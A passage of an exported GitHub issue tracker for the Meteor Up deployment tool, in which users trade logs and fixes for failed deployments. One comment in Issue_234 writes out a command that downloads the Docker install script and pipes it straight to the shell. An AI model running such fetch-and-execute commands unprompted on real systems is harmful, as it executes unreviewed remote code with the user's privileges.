    source-map-support@0.2.8 node_modules/source-map-support
    &#9492;&#9472;&#9472; source-map@0.1.32 (amdefine@0.1.0)

    fibers@1.0.5 node_modules/fibers
    Waiting for MongoDB to initialize. (5 minutes)
    connected
    eventum stop/waiting
    eventum start/running, process 7343
    Waiting for 30 seconds while app is booting up
    Checking is app booted or not?
    eventum stop/waiting
    eventum start/running, process 7476
    ----------------------------------------------------------------------------
```

Anyone have a idea where I can look at?
</Body>
    <State>open</State>
    <Comment>
      <Owner>katopz</Owner>
      <Body>What's your `mup.json` look like? Are you set 

```
  "app": "/path/to/the/app",
```

properly?
</Body>
    </Comment>
    <Comment>
      <Owner>cezdev</Owner>
      <Body>It is set like this :  
     "app": ".",
That's correct, right?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I think once before it was said putting the full true path helped. Maybe try that and report back thanks.
</Body>
    </Comment>
    <Comment>
      <Owner>cezdev</Owner>
      <Body>Hi. I tried putting the full path and it worked like a charm!
Just letting you know. Thanks for the tip.
</Body>
    </Comment>
  </Issue_223>
  <Issue_224>
    <Repository>meteor-up-legacy</Repository>
    <Title>Deploy App - Error at 'Invoking deployment process'</Title>
    <Owner>arunoda</Owner>
    <Body>Hi guys,

having a lot of problems deploying my app. Everything went smoothly last week, but now I have tons of errors in console.
First I had errors at the first step of the deployment, saying it was something about the 'handshake'.
I updated nodejs on the both servers where I do the deployment, and did the mup setup again, with new version of nodejs in mup.json: 

``` json
{
    "servers": [
        {
            "host": "178.239.183.43",
            "username": "***",
            "pem": "/full/path/to/key.pem"
    }, {
            "host": "178.239.184.62",
            "username": "***",
            "pem": "/full/path/to/key.pem"
    }
  ],

    "setupMongo": false,

    "setupNode": true,

    "nodeVersion": "0.10.37",

    "setupPhantom": true,

    "appName": "***",

    "app": "/full/path/to/app",

    "env": {
        "ROOT_URL": "link",
        "MONGO_URL": "mongodb..." // external DB
    },
    "deployCheckWaitTime": 30
}
```

and everything went smooothly, no errors whatsover: 

``` console
Started TaskList: Setup (linux)
[178.239.183.43] - Installing Node.js
[178.239.184.62] - Installing Node.js
[178.239.183.43] - Installing Node.js: SUCCESS
[178.239.183.43] - Installing PhantomJS
[178.239.184.62] - Installing Node.js: SUCCESS
[178.239.184.62] - Installing PhantomJS
[178.239.183.43] - Installing PhantomJS: SUCCESS
[178.239.183.43] - Setting up Environment
[178.239.184.62] - Installing PhantomJS: SUCCESS
[178.239.184.62] - Setting up Environment
[178.239.183.43] - Setting up Environment: SUCCESS
[178.239.183.43] - Configuring upstart
[178.239.183.43] - Configuring upstart: SUCCESS
[178.239.184.62] - Setting up Environment: SUCCESS
[178.239.184.62] - Configuring upstart
[178.239.184.62] - Configuring upstart: SUCCESS
```

at this step I thought everything would go smoothly also with the deployment on both servers. instead I've got these errors, same on both servers:

``` console
Started TaskList: Deploy app 'reebesapp' (linux)
[178.239.184.62] - Uploading bundle
[178.239.184.62] - Uploading bundle: SUCCESS
[178.239.184.62] - Setting up Environment Variables
[178.239.184.62] - Setting up Environment Variables: SUCCESS
[178.239.184.62] - Invoking deployment process
[178.239.184.62] x Invoking deployment process: FAILED

    -----------------------------------STDERR-----------------------------------
       '-Goutput_dir=.' ]
    gyp info spawn make
    gyp info spawn args [ 'BUILDTYPE=Release', '-C', 'build' ]
    gyp info ok 
    sudo: unable to resolve host meteor-new
    npm WARN package.json meteor-dev-bundle@0.0.0 No description
    npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
    npm WARN package.json meteor-dev-bundle@0.0.0 No README data
    sudo: unable to resolve host meteor-new
    sudo: unable to resolve host meteor-new
    sudo: unable to resolve host meteor-new
    sudo: unable to resolve host meteor-new
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) couldn't connect to host
    sudo: unable to resolve host meteor-new
    sudo: unable to resolve host meteor-new
    sudo: unable to resolve host meteor-new
    sudo: unable to resolve host meteor-new
    Latest deployment failed! Reverted back to the previous version.
    -----------------------------------STDOUT-----------------------------------
    /bcrypt_lib.node
    make: Leaving directory `/opt/reebesapp/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build'

    &gt; fibers@1.0.5 install /opt/reebesapp/tmp/bundle/programs/server/node_modules/fibers
    &gt; node ./build.js

    `linux-x64-v8-3.14` exists; testing
    Binary is fine; exiting
    underscore@1.5.2 node_modules/underscore

    semver@4.1.0 node_modules/semver

    eachline@2.3.3 node_modules/eachline
    &#9492;&#9472;&#9472; type-of@2.0.1

    chalk@0.5.1 node_modules/chalk
    &#9500;&#9472;&#9472; ansi-styles@1.1.0
    &#9500;&#9472;&#9472; escape-string-regexp@1.0.3
    &#9500;&#9472;&#9472; supports-color@0.2.0
    &#9500;&#9472;&#9472; has-ansi@0.1.0 (ansi-regex@0.2.1)
    &#9492;&#9472;&#9472; strip-ansi@0.3.0 (ansi-regex@0.2.1)

    fibers@1.0.5 node_modules/fibers

    source-map-support@0.2.8 node_modules/source-map-support
    &#9492;&#9472;&#9472; source-map@0.1.32 (amdefine@0.1.0)
    Waiting for MongoDB to initialize. (5 minutes)
    connected
    reebesapp stop/waiting
    reebesapp start/running, process 25589
    Waiting for 30 seconds while app is booting up
    Checking is app booted or not?
    reebesapp stop/waiting
    reebesapp start/running, process 25635
    ----------------------------------------------------------------------------

```

does anyone knows what to do?
</Body>
    <State>open</State>
    <Comment>
      <Owner>nick-preda</Owner>
      <Body>**updates

All my virtual machines had 512MB of RAM, so at a certain point the app crashed because no memory was left. I increased the RAM to 2GB, and 'mup deploy' worked for the first time right away.

now i'm receiving the same errors as before
</Body>
    </Comment>
    <Comment>
      <Owner>elie222</Owner>
      <Body>Any info from `mup logs -n 300`?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Maybe check the hostnames resolve from ssh shell as well and the ports are open. 
Also try mupx 
</Body>
    </Comment>
    <Comment>
      <Owner>elie222</Owner>
      <Body>There's a problem with mup 0.11.1

Revert back to 0.11.0 and it should work:
`sudo npm install mup@0.11.0 -g`
</Body>
    </Comment>
    <Comment>
      <Owner>nick-preda</Owner>
      <Body>trying with downgrading mup
then I'll try with mupx.

thanks, and I'll let you know in a bit
</Body>
    </Comment>
    <Comment>
      <Owner>nick-preda</Owner>
      <Body>tried different things, still nothing works:
mup downgraded, with different nodejs versions in mup.json, re-doing everytime the mup setup.

tried also mupx, installing the latest version, doing mupx setup with the same settings of mup, and when doing mupx deploy I have these errors:

``` console
x Invoking deployment process: FAILED

    -----------------------------------STDERR-----------------------------------
    sudo: unable to resolve host meteor-helper
    sudo: unable to resolve host meteor-helper
    sudo: unable to resolve host meteor-helper
    Error response from daemon: no such id: reebesapp
    Error: failed to remove containers: [reebesapp]
    Error response from daemon: no such id: reebesapp-frontend
    Error: failed to remove containers: [reebesapp-frontend]
    Error response from daemon: Cannot start container 52c012b7e4a59425b21d7291f0a8eded7dad15d805bdac0e3e2267a85cb069ca: Error starting userland proxy: listen tcp 0.0.0.0:80: bind: address already in use
    -----------------------------------STDOUT-----------------------------------
    41: Verifying Checksum
    b545df9bb341: Download complete
    b545df9bb341: Download complete
    66b378b5905c: Verifying Checksum
    66b378b5905c: Download complete
    041bc56089e7: Verifying Checksum
    041bc56089e7: Download complete
    715693557c06: Verifying Checksum
    715693557c06: Download complete
    60c52dbe9d91: Verifying Checksum
    60c52dbe9d91: Download complete
    16e0fe9fbd39: Verifying Checksum
    16e0fe9fbd39: Download complete
    4c8cbfd2973e: Verifying Checksum
    4c8cbfd2973e: Download complete
    cd378c1c4783: Verifying Checksum
    cd378c1c4783: Download complete
    4c8cbfd2973e: Pull complete
    60c52dbe9d91: Pull complete
    66b378b5905c: Pull complete
    715693557c06: Pull complete
    16e0fe9fbd39: Pull complete
    cd378c1c4783: Pull complete
    041bc56089e7: Pull complete
    b545df9bb341: Pull complete
    b545df9bb341: Already exists
    Digest: sha256:44960a933248c70b2e6a69df8fac4d3f0c521299ef153186552f46d27053385c
    Status: Downloaded newer image for meteorhacks/meteord:base
    52c012b7e4a59425b21d7291f0a8eded7dad15d805bdac0e3e2267a85cb069ca
    ----------------------------------------------------------------------------
```
</Body>
    </Comment>
    <Comment>
      <Owner>nick-preda</Owner>
      <Body>alright, everything works now.
here's my procedure, eventually for someone dealing with the same problems:
1. solved the hostname error, easily adding the 127.0.1.1 field in etc/hosts
2. changed in mup.json the node version: from 0.10.37 to the latest stable 0.12.5 ("nodeVersion": "0.12.5",), which did it all.

it still doesn't work on the machine with 512mb of ram, which tells me that the webapp is pretty heavy

Cheers guys, and thanks for the help :)
</Body>
    </Comment>
    <Comment>
      <Owner>elie222</Owner>
      <Body>Use a longer "deployCheckWaitTime": 30 if the app is heavy. Try 60. This fixed it for me.
</Body>
    </Comment>
  </Issue_224>
  <Issue_225>
    <Repository>meteor-up-legacy</Repository>
    <Title> iptables failed: Do I need to add database port to iptables or what does this mean? </Title>
    <Owner>arunoda</Owner>
    <Body>[129.132.243.100] x Installing MongoDB: FAILED

```
-----------------------------------STDERR-----------------------------------
Error response from daemon: Cannot start container a7e04bdd9f3c446cf70fcac4124b0a682a3f7461118acbf18dc42de257ac8168: iptables failed: iptables --wait -t filter -A DOCKER ! -i docker0 -o docker0 -p tcp -d 172.17.0.11 --dport 27017 -j ACCEPT: iptables: No chain/target/match by that name.
 (exit status 1)
-----------------------------------STDOUT-----------------------------------
latest: Pulling from mongo
4c8cbfd2973e: Already exists
60c52dbe9d91: Already exists
9eddd1a555fc: Already exists
675abd82e9c0: Already exists
0e1f126ca2a3: Already exists
403a86009909: Already exists
71935c220489: Already exists
e18ca47dafd5: Already exists
5d3d9190480f: Already exists
6f1e86ca3030: Already exists
350ec4167f25: Already exists
17d72b50183c: Already exists
df68dc6697c5: Already exists
9b502e766021: Already exists
59ae9d06e959: Already exists
02a74f0abd80: Already exists
9ade5017d47b: Already exists
9ade5017d47b: Already exists
Digest: sha256:fb6b60d73765ea634de00a075a22cc731b02c3c8dbc274fac7d08b65db190995
Status: Image is up to date for mongo:latest
mongodb
a7e04bdd9f3c446cf70fcac4124b0a682a3f7461118acbf18dc42de257ac8168
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>It's already running it seems. Either disable mongo with false and point to your running mongodb_url or stop yours and set to true, etc.
</Body>
    </Comment>
  </Issue_225>
  <Issue_226>
    <Repository>meteor-up-legacy</Repository>
    <Title>Using all vCPU available on the only server NO cluster</Title>
    <Owner>arunoda</Owner>
    <Body>Hello,

I have a server with 4 vCPU and some 7.5 GB RAM i wonder how can i make use of all virtual CPU on my server so the meteor runs faster with no lags.

is there a way to add ssl in the mup config ?

Thanks you
</Body>
    <State>open</State>
    <Comment>
      <Owner>elie222</Owner>
      <Body>Use the meteorhacks:cluster package.

Although beware that people (including me) have had issues with cluster multicore support.
</Body>
    </Comment>
  </Issue_226>
  <Issue_227>
    <Repository>meteor-up-legacy</Repository>
    <Title>Did you forget to call 'Npm.depends' in package.js within the 'iron_router' package?</Title>
    <Owner>arunoda</Owner>
    <Body>I met this one when deploying to aws ec2 ubuntu. 
When deploying, it says:
- Invoking deployment process
  [54.67.44.190] x Invoking deployment process: FAILED
  
  -----------------------------------STDERR-----------------------------------
  gyp_dir=/usr/lib/node_modules/node-gyp',
  gyp info spawn args   '-Dmodule_root_dir=/opt/carllo/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt',
  gyp info spawn args   '--depth=.',
  gyp info spawn args   '--no-parallel',
  gyp info spawn args   '--generator-output',
  gyp info spawn args   'build',
  gyp info spawn args   '-Goutput_dir=.' ]
  gyp info spawn make
  gyp info spawn args [ 'BUILDTYPE=Release', '-C', 'build' ]
  gyp info ok 
  npm WARN package.json meteor-dev-bundle@0.0.0 No description
  npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
  npm WARN package.json meteor-dev-bundle@0.0.0 No README data
    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                   Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 80: Connection refused
    Latest deployment failed! Reverted back to the previous version.
    -----------------------------------STDOUT-----------------------------------

The log is from mup logs -n 300: "Did you forget to call 'Npm.depends' in package.js within the 'iron_router' package?"
Searched online but did not find obvious solution.
</Body>
    <State>open</State>
    <Comment>
      <Owner>harlyluyar</Owner>
      <Body>This looks like related to iron-router, but it is working in local.
After a few trying, finally I resolved this issue, just need to reset meteor:
meteor reset;
meteor update;

That's it.
I put it here, may help others seeing this issue.
</Body>
    </Comment>
  </Issue_227>
  <Issue_228>
    <Repository>meteor-up-legacy</Repository>
    <Title>Deploy Error: Initialization failed</Title>
    <Owner>arunoda</Owner>
    <Body>Any idea?

```
mup deploy

Meteor Up: Production Quality Meteor Deployments
------------------------------------------------

Building Started: /srv/www/meteor/london
.write(string, encoding, offset, length) is deprecated. Use write(string, offset, length, encoding) instead.

Started TaskList: Deploy app 'ufg' (linux)
[placetee.us] - Uploading bundle

crypto.js:431
    this._binding = new binding.DiffieHellman(sizeOrKey);
                    ^
Error: Initialization failed
    at new DiffieHellman (crypto.js:431:21)
    at Object.DiffieHellman (crypto.js:424:12)
    at onKEXDH_GEX_GROUP (/usr/local/lib/node_modules/mup/node_modules/nodemiral/node_modules/ssh2/node_modules/ssh2-streams/lib/ssh.js:2349:22)
    at SSH2Stream.&lt;anonymous&gt; (/usr/local/lib/node_modules/mup/node_modules/nodemiral/node_modules/ssh2/node_modules/ssh2-streams/lib/ssh.js:191:36)
    at SSH2Stream.EventEmitter.emit (events.js:106:17)
    at parse_KEX (/usr/local/lib/node_modules/mup/node_modules/nodemiral/node_modules/ssh2/node_modules/ssh2-streams/lib/ssh.js:3856:14)
    at parsePacket (/usr/local/lib/node_modules/mup/node_modules/nodemiral/node_modules/ssh2/node_modules/ssh2-streams/lib/ssh.js:3731:12)
    at SSH2Stream._transform (/usr/local/lib/node_modules/mup/node_modules/nodemiral/node_modules/ssh2/node_modules/ssh2-streams/lib/ssh.js:555:13)
    at SSH2Stream.Transform._read [as __read] (_stream_transform.js:179:10)
    at SSH2Stream._read (/usr/local/lib/node_modules/mup/node_modules/nodemiral/node_modules/ssh2/node_modules/ssh2-streams/lib/ssh.js:213:15)
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>First fix the depreciated write, although it shouldn't be a problem.
second try mupx.
</Body>
    </Comment>
    <Comment>
      <Owner>ipstas</Owner>
      <Body>not sure where that 'write' comes from, but the error is about ssl/ssh
and mupx gives the exact same error.
What puzzles me, sometimes it goes through
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Did you try following the instructions to upgrade meaning you'very done a clean mupx install? 
</Body>
    </Comment>
    <Comment>
      <Owner>ipstas</Owner>
      <Body>Yes, I have created the new folder and run mupx init, setup and tried deploy
The only difference as I can see is the mup.json. And the only difference in mup.json is

```
&lt;   "enableUploadProgressBar": true,
&lt;
&lt;       "buildOptions": {
&lt;               // build with the debug mode on
&lt;               "debug": true
&lt;       }
&lt; }
```

It looks like there is timeout error with ssh, the strange thing sometimes it goes OK, but mostly it fails before I see the progress bar.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>How about running 'npm updates'?
Maybe node needs updating. What version of node is installed? 
Can you test ssh is working as expected? 
</Body>
    </Comment>
    <Comment>
      <Owner>ipstas</Owner>
      <Body>```
npm version
{ http_parser: '1.0',
  node: '0.11.8-pre',
  v8: '3.20.17',
  uv: '0.11.13',
  zlib: '1.2.3',
  modules: '13',
  openssl: '1.0.1e',
  npm: '1.3.11' }
```

I have tried ssh as the first possible issue. No problem, ssh connects instantly

Stupid of me, the latest npm is 2.13.1
`npm install npm -g` works

So I have updated it, still it did not fix the error, I keep getting

```
mupx deploy

Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

Meteor app path    : /srv/www/meteor/london
Using buildOptions : {"debug":true}
.write(string, encoding, offset, length) is deprecated. Use write(string, offset, length, encoding) instead.

Started TaskList: Deploy app 'placetee' (linux)
[www.placetee.us] - Uploading bundle

crypto.js:431
    this._binding = new binding.DiffieHellman(sizeOrKey);
                    ^
Error: Initialization failed
    at new DiffieHellman (crypto.js:431:21)
    at Object.DiffieHellman (crypto.js:424:12)
    at onKEXDH_GEX_GROUP (/usr/local/lib/node_modules/mupx/node_modules/nodemiral/node_modules/ssh2/node_modules/ssh2-streams/lib/ssh.js:2349:22)
    at SSH2Stream.&lt;anonymous&gt; (/usr/local/lib/node_modules/mupx/node_modules/nodemiral/node_modules/ssh2/node_modules/ssh2-streams/lib/ssh.js:191:36)
    at SSH2Stream.EventEmitter.emit (events.js:106:17)
    at parse_KEX (/usr/local/lib/node_modules/mupx/node_modules/nodemiral/node_modules/ssh2/node_modules/ssh2-streams/lib/ssh.js:3856:14)
    at parsePacket (/usr/local/lib/node_modules/mupx/node_modules/nodemiral/node_modules/ssh2/node_modules/ssh2-streams/lib/ssh.js:3731:12)
    at SSH2Stream._transform (/usr/local/lib/node_modules/mupx/node_modules/nodemiral/node_modules/ssh2/node_modules/ssh2-streams/lib/ssh.js:555:13)
    at SSH2Stream.Transform._read [as __read] (_stream_transform.js:179:10)
    at SSH2Stream._read (/usr/local/lib/node_modules/mupx/node_modules/nodemiral/node_modules/ssh2/node_modules/ssh2-streams/lib/ssh.js:213:15)
```
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Okay maybe this link will help...
https://github.com/arunoda/meteor-up/issues/427
it says they reverted back a version.
</Body>
    </Comment>
    <Comment>
      <Owner>ipstas</Owner>
      <Body>Thanks! I think that was it.

```
npm install -g n
n 0.12.7
```

0.12.7 - the latest ad greatest, I had 0.11 before (0.10.something works too), 0.11 has something broken

And now it flies
</Body>
    </Comment>
  </Issue_228>
  <Issue_229>
    <Repository>meteor-up-legacy</Repository>
    <Title>STD ERR line 5: cd: ./*:</Title>
    <Owner>arunoda</Owner>
    <Body>I've sucessfully deployed my app once. Connected it to an external database. I decided to make a few changes to the code. After I saved the changes I ran 'mup setup' and then 'mup deploy'. Everything goes smoothly until it tries to invoke deployment. Thats when I get this error:

-----------------------------------STDERR-----------------------------------
    bash: line 5: cd: ./*: No such file or directory
    -----------------------------------STDOUT-----------------------------------
    ----------------------------------------------------------------------------

I have no idea where this is referring to. Is this even the right way to update your code?
</Body>
    <State>open</State>
    <Comment>
      <Owner>gitTerebi</Owner>
      <Body>Started getting same errors today as well.

After lots of mucking about,
I ended up reverting changes to my packages file, and changing  "deployCheckWaitTime"
to 100.

I still don't know what caused the issue at the end.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>It would be useful to see more of what step it was at last or currently in from the logs?
Also try using...
    DEBUG *= mupx deploy
to provide better error logging, thanks.
</Body>
    </Comment>
  </Issue_229>
  <Issue_230>
    <Repository>meteor-up-legacy</Repository>
    <Title>Deployment failes (No such file or directory)</Title>
    <Owner>arunoda</Owner>
    <Body>I'm trying to figure out exactly how to deploy to both production and staging environments.
So far I have separate mup.json &amp; settings.json files in private/production and private/staging, but deploying either of them always results in the following error:

``` bash
bash: line 5: cd: ./*: No such file or directory
```

MUP works fine if I run it from the root of the project, but apparently not if I run it from subfolders?
As for the "app" variable, I set it like so:

``` json
"app": "~/Documents/Meteor/my-app",
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>Dids</Owner>
      <Body>This might have just been an issue with the hostname not resolving/not being able to connect, would be nice if the error message gave a clue as to what was wrong.

Anyway, I switched to mupx, used an IP address instead of the hostname, and I was good to go. I guess I'll close this for now.
</Body>
    </Comment>
    <Comment>
      <Owner>fakenickels</Owner>
      <Body>Facing the same issue here, that seems to happen in `deploy.sh` at line 5:

``` sh
gyp_rebuild_inside_node_modules () {
  for npmModule in ./*; do
    cd $npmModule
```
</Body>
    </Comment>
    <Comment>
      <Owner>fakenickels</Owner>
      <Body>Can you re-open this thread @Dids?
</Body>
    </Comment>
    <Comment>
      <Owner>fakenickels</Owner>
      <Body>I solved it replacing all `./*` by `$(ls)` in `deploy.sh` :)
</Body>
    </Comment>
  </Issue_230>
  <Issue_231>
    <Repository>meteor-up-legacy</Repository>
    <Title>NodeJS install fails, "sudo: command not found"</Title>
    <Owner>arunoda</Owner>
    <Body>I'm getting this error when I run "mup setup". 

 Installing Node.js: FAILED

```
-----------------------------------STDERR-----------------------------------
bash: line 4: sudo: command not found
bash: line 5: sudo: command not found
bash: line 6: sudo: command not found
bash: line 10: sudo: command not found
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>daithi-coombes</Owner>
      <Body>I'm receiving the same issue - are you using `debian`?

Seesm on `debian` servers sudo may not be installed:
http://unix.stackexchange.com/questions/106529/is-sudo-not-installed-by-default-in-debian
</Body>
    </Comment>
    <Comment>
      <Owner>daithi-coombes</Owner>
      <Body>For me the simple solution was to install `sudo`..

First update server to latest:

``` bash
# apt-get -y update
# apt-get -y upgrade
```

Then install `sudo`:

```
# apt-get install sudo
```
</Body>
    </Comment>
    <Comment>
      <Owner>superandrew213</Owner>
      <Body>thanks @daithi-coombes that worked for me.
</Body>
    </Comment>
  </Issue_231>
  <Issue_232>
    <Repository>meteor-up-legacy</Repository>
    <Title>Deployment issue: Error while building for mobile platforms: EACCES, unlink</Title>
    <Owner>arunoda</Owner>
    <Body>When I run mup deploy, I get back this:

$ mup deploy
## Meteor Up: Production Quality Meteor Deployments

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Building Started: .
Error while building for mobile platforms: EACCES, unlink
'/Users/husam/Desktop/SOFTWARE/todos/.meteor/local/cordova-build/resources/android_hdpi.icon.png'

=&gt; Build Error. Check the logs printed above.

mup setup runs successfully. 

Any suggestions? Thanks!
</Body>
    <State>open</State>
    <Comment>
      <Owner>janjackson</Owner>
      <Body>same here. Did you find a solution @hudat ? :)
</Body>
    </Comment>
  </Issue_232>
  <Issue_233>
    <Repository>meteor-up-legacy</Repository>
    <Title>Gracefully shutdown when deploying new version</Title>
    <Owner>arunoda</Owner>
    <Body>Ideally we would be able to:
- gracefully shutdown current version ( executing some custom code before the actual exit  of the app )
- fire another one in parallel which takes the new connections on board

Is thee any way of achieving this at the moment?
</Body>
    <State>open</State>
    <Comment>
      <Owner>hems</Owner>
      <Body>@hsduk following your procedure we would still have to let the old server now that it will shutdown due to new version release, so it can gracefully shutdown. surely this would help in some cases ( :
</Body>
    </Comment>
    <Comment>
      <Owner>hems</Owner>
      <Body>perhaps this is the file that should do all this magic?

https://github.com/arunoda/meteor-up/blob/mupx/templates/linux/start.sh

@arunoda perhaps we could benefit from adding https://www.consul.io to the project, so we could see services and versions from a nice dashboard?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I thought a rolling update takes one machine (of 5 min) down at a time and it doesn't need to be graceful (routing will catch an incomplete request and resend to another machine internally) as it also doesn't matter there are 2 versions deployed at the same time for a handful of minutes or more. So my understanding is since you don't need to be graceful you shouldn't. The purpose of the failsafe multimachine deployment means this is not worth the cycles [still I expect a signal to shutdown properly is sent anyway].
Also I'm thinking some of the features of consul are already there like key value store in etcd etc.still its probably best as an optional preference that is useful for some, but not desired by everybody.
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>mupx(anb mup) have rolling deployment support. It's enabled by default. So, we don't work on graceful shutdown.

Graceful shutdown is an anti-pattern. In cloud era, server could die anytime. So, you need prepare your app for this. `Graceful shutdown` is a hurdle for that.
</Body>
    </Comment>
    <Comment>
      <Owner>hems</Owner>
      <Body>i get that the app should be stateless, but sometimes it's very counter-intuitive so might worth having something simple, like

```
process.on('SIGTERM', function () {
  clean_my_stuff();
  process.exit(0);
});
```

:v: 
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I think you're right that somewhere in the rolling update it does this already or should. I've not looked into that yet. In a way it's not needed. Basically if a database write occurred and then it shuts down before a reply is fully returned a new message will occur, so in you meteor code it should not for instance cause a double increment etc. I'm uncertain if meteor would already recognize it's a duplicate message. 
Still if it's not the MongoDB master node in the meteor cluster it would probably not cause a problem (as that is routed there, or does it sync via watching the DB change log?).
So maybe just cause a re-election (change master Mongo container) if and only if it's the Mongo master updating. 
Either way Meteor or Mongo will likely do the right thing (sorting and verify change logs) but again maybe your code needs to be fool proof too.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I remember now the Container will get a SIGTERM when shutdown and so therefore it will complete current requests, before complying. 
</Body>
    </Comment>
    <Comment>
      <Owner>hems</Owner>
      <Body>@MasterJames on my specific application i'm keeping track of not-logged in users, and communicate with them through DDP.

When my meteor shutdown:
- Clients need reconnect to ddp again, using another instance and this already happens.
- The instance that is being shutdown needs to related information from my mongodb

At the moment on the server i listen to the `subscription.onStop`  to do my "clean up", but i'm not sure if this is called even when the server is being shutdown during deploy ( it seems some times it doesn't? i might be wrong )

I did a test on my server

```
 # server/app.js
 Meteor.startup(function() {
  process.on('SIGTERM', function() {
    console.log("sigterm");
  });
});
```

and it's being called twice when using meteor locally and i'm assuming the same happens on the server when using `mup deploy`.

I'm not sure if `process.exit(0)` after my "clean up" would actually mess with meteor's own SIGTERM listener ?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I'm not an expert at this yet, so I hope someone else can help explain.
my understanding is the database master will be re-elected before the original completes its shuts down, or new request will queue until that's done.
You/We should not need to cleanup and should design the code to store things in the database.
I recall you can force automatically a guest user account, so maybe you/we need to do that if you need something to persist.Also storing that stuff in an internal state maybe an option.

I'm waiting for AWS EFS (preview only I'm on a waitlist) as I suspect Galaxy is too.
So my thoughts are coming from a hopefully feasible shared folder perspective. I'm left wondering if all container instances in the meteor cluster are watching the change logs (but have not inspected that code yet either), or forward thier DB requests?
</Body>
    </Comment>
  </Issue_233>
  <Issue_234>
    <Repository>meteor-up-legacy</Repository>
    <Title>[mupx] custom SSH port ignored - Dockr setup timeout error</Title>
    <Owner>arunoda</Owner>
    <Body>Update: Turns out, the custom SSH port ("sshOptions": { "port" : 12345 }, config) is being ignored when "Port" is in capital letter, something that worked with mup. Truly strange case.

When trying to setup mupx with "mupx setup", we get a dockr setup error.

We initially tried with the VM that hosted mup before, reusing that config.
Then tried a new VM. Same error. The VM Image is "Ubuntu-14_04_1-LTS-amd64-server". 

```
&gt; mupx setup

Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;


Started TaskList: Setup (linux)
[rentkitbeta.cloudapp.net] - Installing Docker
events.js:85
      throw er; // Unhandled 'error' event
            ^
Error: Timed out while waiting for handshake
    at null._onTimeout (/usr/local/lib/node_modules/mupx/node_modules/nodemiral/node_modules/ssh2/lib/client.js:138:17)
    at Timer.listOnTimeout (timers.js:110:15)
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>thomasf1</Owner>
      <Body>Installing Dockr manually via "wget -qO- https://get.docker.com/ | sh" + "sudo usermod -aG docker mup" and then running mupx setup doesn't seem to help either...
</Body>
    </Comment>
    <Comment>
      <Owner>dkmooers</Owner>
      <Body>+1

Got the same error on Ubuntu 15.04 via Linode
</Body>
    </Comment>
    <Comment>
      <Owner>dkmooers</Owner>
      <Body>:facepalm: - forgot to boot my Linode first. Works fine now!
</Body>
    </Comment>
    <Comment>
      <Owner>thomasf1</Owner>
      <Body>The error is still there in 1.5.1, probably a connection error, we&#180;re using pem authentication + a custom SSH port (though that&#180;s also in the "mupx init" default mup.json - so we thought that&#180;s supported).
</Body>
    </Comment>
    <Comment>
      <Owner>thomasf1</Owner>
      <Body>Ah, figured it out... the custom SSH port is being ignored currently.
</Body>
    </Comment>
    <Comment>
      <Owner>thomasf1</Owner>
      <Body>Turns out, the issue is that our old configuration said "Port" (which works with mup), mupx seems to require it as lowercase though (which is better style anyway). Kinda hard to track down.
</Body>
    </Comment>
  </Issue_234>
  <Issue_235>
    <Repository>meteor-up-legacy</Repository>
    <Title>Building Android app connecting to mongoDB</Title>
    <Owner>arunoda</Owner>
    <Body>Hi, sorry the `mupx` documentation is not detailed enough   

---

Where can I find the info on mobileSettings, I need more details on setting up this config? I feel like missing out something.

```
 "buildOptions": {
   "debug": true,
   "mobileSettings": {
     "public": {
       "meteor-up": "rocks"
     }
   }
 }
```

---

&gt; You can't access the MongoDB from the outside the server

How can I build my android app and connect to my mongodb hosting on my server with `mupx`? It was working fine with `mup`
`meteor build .output/. --server xxx.site.com`

My config for buildOptions doesnt build the android app for me
     `"buildOptions": {
         "directory":".output/.","server":"xxx.site.com"}
       },`

I am lost, thanks
</Body>
    <State>open</State>
    <Comment>
      <Owner>dkouvdis</Owner>
      <Body>When I output the apk and install into my phone - When opening the first time and I could see my list of data coming from the database, the next second the app flash/refreshes automatically and it disappears.

Also I add this function Meteor.status() as a helper - The status returned connected for a second and now is returning `waiting` like above.

Looks like after a second it prevent any further ddp/oplong connection which I am not sure.

&gt; Further note
- I am not using "MONGO_URL", I assume I left it as a default?
- Not using SSL, is it required?
</Body>
    </Comment>
    <Comment>
      <Owner>dkouvdis</Owner>
      <Body>Here's the link of the screen recording reflecting the issue I have above
http://gph.is/1HPDM6J

The left side, is my app viewed from the browser, on the right is the emulator of the android app. After clearing the cache, I can see my data only for a second.
</Body>
    </Comment>
    <Comment>
      <Owner>dkouvdis</Owner>
